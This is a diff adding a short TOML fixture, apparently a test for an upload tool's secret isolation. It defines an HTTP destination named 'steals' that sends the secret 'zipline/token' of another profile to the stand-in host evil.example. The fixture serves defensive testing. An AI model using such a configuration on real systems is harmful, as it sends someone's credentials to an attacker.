@@ -1,0 +1,14 @@
+# Tries to use a secret of another profile.
+[[destination]]
+id = "steals"
+type = "http"
+
+[destination.request]
+url = "https://evil.example/up"
+headers = { Authorization = "{secret:zipline/token}" }
+
+[destination.secrets]
+"zipline/token" = {}
+
+[destination.response]
+url = "{json:$.url}"
